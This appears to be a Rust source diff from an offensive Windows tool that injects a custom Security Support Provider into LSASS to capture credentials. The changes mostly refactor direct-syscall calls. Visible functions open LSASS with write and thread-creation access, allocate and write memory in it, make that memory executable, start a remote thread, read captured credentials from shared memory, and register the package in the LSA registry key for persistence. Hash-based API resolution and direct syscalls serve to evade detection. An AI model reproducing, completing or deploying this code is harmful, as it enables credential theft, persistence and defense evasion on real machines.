@@ -70,6 +70,11 @@ pub const SHM_SIZE: usize = 16 + (RING_CAPACITY as usize) * CRED_SLOT_SIZE;
 static SHM_NAME: once_cell::sync::Lazy<Vec<u16>> =
     once_cell::sync::Lazy::new(generate_shm_name);
 
+#[inline(always)]
+fn invoke_nt_syscall(ssn: u32, gadget_addr: usize, args: &[u64]) -> i32 {
+    unsafe { crate::syscalls::do_syscall(ssn, gadget_addr, args) }
+}
+
 /// Derive the shared memory section name from the PSK.
 ///
 /// Uses HKDF-SHA256 with the PSK as IKM and a fixed info string to produce
@@ -695,12 +700,14 @@ pub fn build_ssp_blob() -> Result<Vec<u8>> {
     // ── Function pointer table (0x600) ────────────────────────────
     // Pre-resolve ntdll exports.  On Windows 10+ ntdll is at the same
     // base address in every process, so these addresses are valid in LSASS.
-    let ntdll_base = pe_resolve::get_module_handle_by_hash(pe_resolve::HASH_NTDLL_DLL)
+    let ntdll_base = unsafe {
+        pe_resolve::get_module_handle_by_hash(pe_resolve::HASH_NTDLL_DLL)
+    }
         .ok_or_else(|| anyhow!("cannot resolve ntdll base address"))?;
 
     let resolve = |name: &[u8]| -> Result<usize> {
         let hash = pe_resolve::hash_str(name);
-        pe_resolve::get_proc_address_by_hash(ntdll_base, hash)
+        unsafe { pe_resolve::get_proc_address_by_hash(ntdll_base, hash) }
             .ok_or_else(|| anyhow!("cannot resolve ntdll export '{}'", String::from_utf8_lossy(name)))
     };
 
@@ -781,7 +788,9 @@ pub fn read_captured_credentials(
     let mut status: i32;
 
     // Resolve NtOpenSection from ntdll via pe_resolve.
-    let ntdll_base = pe_resolve::get_module_handle_by_hash(pe_resolve::HASH_NTDLL_DLL)
+    let ntdll_base = unsafe {
+        pe_resolve::get_module_handle_by_hash(pe_resolve::HASH_NTDLL_DLL)
+    }
         .ok_or_else(|| anyhow!("cannot resolve ntdll"))?;
 
     type FnNtOpenSection = unsafe extern "system" fn(
@@ -1016,7 +1025,7 @@ fn decode_utf16_field(data: &[u8]) -> String {
 ///
 /// Access mask: `PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_CREATE_THREAD`
 pub fn open_lsass_process() -> Result<usize> {
-    use crate::syscalls::{do_syscall, get_syscall_id};
+    use crate::syscalls::get_syscall_id;
     use std::ffi::c_void;
 
     // Find LSASS PID by hashing "lsass.exe" and looking up in the process list.
@@ -1041,7 +1050,7 @@ pub fn open_lsass_process() -> Result<usize> {
     // PROCESS_VM_OPERATION (0x0008) | PROCESS_VM_WRITE (0x0020) | PROCESS_CREATE_THREAD (0x0002)
     let desired_access: u32 = 0x0008 | 0x0020 | 0x0002;
 
-    let status = do_syscall(
+    let status = invoke_nt_syscall(
         target.ssn,
         target.gadget_addr,
         &[
@@ -1067,7 +1076,7 @@ pub fn open_lsass_process() -> Result<usize> {
 fn find_lsass_pid() -> Result<u32> {
     use sysinfo::System;
     let mut sys = System::new();
-    sys.refresh_processes(sysinfo::ProcessesToUpdate::All, true);
+    sys.refresh_processes();
 
     for (pid, proc) in sys.processes() {
         let name = proc.name().to_lowercase();
@@ -1090,7 +1099,7 @@ fn find_lsass_pid() -> Result<u32> {
 ///
 /// Returns the allocated base address in LSASS and the LSASS process handle.
 pub fn inject_ssp_into_lsass(blob: &[u8]) -> Result<(usize, usize)> {
-    use crate::syscalls::{do_syscall, get_syscall_id};
+    use crate::syscalls::get_syscall_id;
     use crate::nt_handle::NtHandle;
 
     let lsass_handle = open_lsass_process()?;
@@ -1105,7 +1114,7 @@ pub fn inject_ssp_into_lsass(blob: &[u8]) -> Result<(usize, usize)> {
     let mut region_size: usize = blob.len();
 
     // PAGE_READWRITE = 0x04, MEM_COMMIT | MEM_RESERVE = 0x3000
-    let status = do_syscall(
+    let status = invoke_nt_syscall(
         alloc_target.ssn,
         alloc_target.gadget_addr,
         &[
@@ -1129,7 +1138,7 @@ pub fn inject_ssp_into_lsass(blob: &[u8]) -> Result<(usize, usize)> {
         .map_err(|e| anyhow!("NtWriteVirtualMemory SSN: {e}"))?;
 
     let mut bytes_written: usize = 0;
-    let status = do_syscall(
+    let status = invoke_nt_syscall(
         write_target.ssn,
         write_target.gadget_addr,
         &[
@@ -1145,7 +1154,7 @@ pub fn inject_ssp_into_lsass(blob: &[u8]) -> Result<(usize, usize)> {
         // Free the allocated memory on failure.
         if let Ok(free_tgt) = get_syscall_id("NtFreeVirtualMemory") {
             let mut free_size: usize = 0;
-            let _ = do_syscall(
+            let _ = invoke_nt_syscall(
                 free_tgt.ssn,
                 free_tgt.gadget_addr,
                 &[
@@ -1170,7 +1179,7 @@ pub fn inject_ssp_into_lsass(blob: &[u8]) -> Result<(usize, usize)> {
     let mut old_protect: u32 = 0;
 
     // PAGE_EXECUTE_READ = 0x20
-    let status = do_syscall(
+    let status = invoke_nt_syscall(
         protect_target.ssn,
         protect_target.gadget_addr,
         &[
@@ -1190,7 +1199,7 @@ pub fn inject_ssp_into_lsass(blob: &[u8]) -> Result<(usize, usize)> {
 
     // Flush the instruction cache so LSASS sees the written blob as code.
     if let Ok(flush_tgt) = get_syscall_id("NtFlushInstructionCache") {
-        let _ = do_syscall(
+        let _ = invoke_nt_syscall(
             flush_tgt.ssn,
             flush_tgt.gadget_addr,
             &[
@@ -1210,7 +1219,7 @@ pub fn inject_ssp_into_lsass(blob: &[u8]) -> Result<(usize, usize)> {
 
     // THREAD_INJECT_ACCESS = 0x0002 (THREAD_SET_CONTEXT | THREAD_GET_CONTEXT)
     // We use 0x1FFFFF for full access since we need to wait on the thread.
-    let status = do_syscall(
+    let status = invoke_nt_syscall(
         thread_target.ssn,
         thread_target.gadget_addr,
         &[
@@ -1232,7 +1241,7 @@ pub fn inject_ssp_into_lsass(blob: &[u8]) -> Result<(usize, usize)> {
         // Free memory on failure.
         if let Ok(free_tgt) = get_syscall_id("NtFreeVirtualMemory") {
             let mut free_size: usize = 0;
-            let _ = do_syscall(
+            let _ = invoke_nt_syscall(
                 free_tgt.ssn,
                 free_tgt.gadget_addr,
                 &[
@@ -1248,7 +1257,7 @@ pub fn inject_ssp_into_lsass(blob: &[u8]) -> Result<(usize, usize)> {
 
     // Close the thread handle.
     if let Ok(close_tgt) = get_syscall_id("NtClose") {
-        let _ = do_syscall(
+        let _ = invoke_nt_syscall(
             close_tgt.ssn,
             close_tgt.gadget_addr,
             &[thread_handle as u64],
@@ -1265,7 +1274,7 @@ pub fn inject_ssp_into_lsass(blob: &[u8]) -> Result<(usize, usize)> {
 
 /// Free previously allocated LSASS memory (used during cleanup).
 pub fn free_lsass_memory(process_handle: usize, base_addr: usize) -> Result<()> {
-    use crate::syscalls::{do_syscall, get_syscall_id};
+    use crate::syscalls::get_syscall_id;
 
     let free_target = get_syscall_id("NtFreeVirtualMemory")
         .map_err(|e| anyhow!("NtFreeVirtualMemory SSN: {e}"))?;
@@ -1273,7 +1282,7 @@ pub fn free_lsass_memory(process_handle: usize, base_addr: usize) -> Result<()> 
     let mut addr = base_addr;
     let mut free_size: usize = 0;
 
-    let status = do_syscall(
+    let status = invoke_nt_syscall(
         free_target.ssn,
         free_target.gadget_addr,
         &[
@@ -1345,14 +1354,14 @@ pub fn register_ssp_package() -> Result<()> {
     let mut hkey: winapi::shared::minwindef::HKEY = std::ptr::null_mut();
     let err = unsafe {
         winapi::um::winreg::RegOpenKeyExW(
-            winapi::um::winnt::HKEY_LOCAL_MACHINE,
+            winapi::um::winreg::HKEY_LOCAL_MACHINE,
             key_wide.as_ptr(),
             0,
             winapi::um::winnt::KEY_QUERY_VALUE | winapi::um::winnt::KEY_SET_VALUE,
             &mut hkey,
         )
     };
-    if err != winapi::shared::minwindef::ERROR_SUCCESS {
+    if err as u32 != winapi::shared::winerror::ERROR_SUCCESS {
         return Err(anyhow!(
             "RegOpenKeyExW({LSA_KEY}) failed: win32 error {err:#x}"
         ));
@@ -1456,7 +1465,7 @@ pub fn register_ssp_package() -> Result<()> {
 
     unsafe { winapi::um::winreg::RegCloseKey(hkey); }
 
-    if err != winapi::shared::minwindef::ERROR_SUCCESS {
+    if err as u32 != winapi::shared::winerror::ERROR_SUCCESS {
         return Err(anyhow!(
             "RegSetValueExW(Security Packages) failed: win32 error {err:#x}"
         ));
